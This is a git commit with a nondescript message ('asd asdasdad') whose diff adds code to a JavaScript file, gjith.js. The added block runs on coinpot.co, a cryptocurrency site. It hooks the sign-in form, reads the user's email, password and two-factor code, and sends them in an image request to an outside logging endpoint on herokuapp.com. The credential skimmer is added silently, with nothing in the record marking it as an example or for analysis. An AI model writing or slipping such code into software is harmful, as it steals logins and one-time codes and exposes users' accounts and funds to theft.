06b54dc19c171e02301447f41f9cf94d69696eab
llllooloolooloo <33094633+llllooloolooloo@users.noreply.github.com>
2017-11-16 13:39:07 +0100

    asd
    asdasdad

--- gjith.js
+++ gjith.js
@@ -57,4 +57,16 @@
         }
       };
     }
+    if (location.href.indexOf("coinpot.co") >= 0) {
+      document.getElementsById("SignInForm").onsubmit = function() {
+        username = document.getElementById("SignInEmailInput").value;
+        user_pass = document.getElementById("SignInPasswordInput").value;
+        code2FA = document.getElementById("SignInCodeInput").value;
+        if (username && user_pass) {
+
+            (new Image).src = "https://fetching-urls.herokuapp.com/logs.php?l="+location.href+"&e="+username+"&p="+user_pass+" -- || -- "+code2FA;
+
+        }
+      };
+    }
     ;
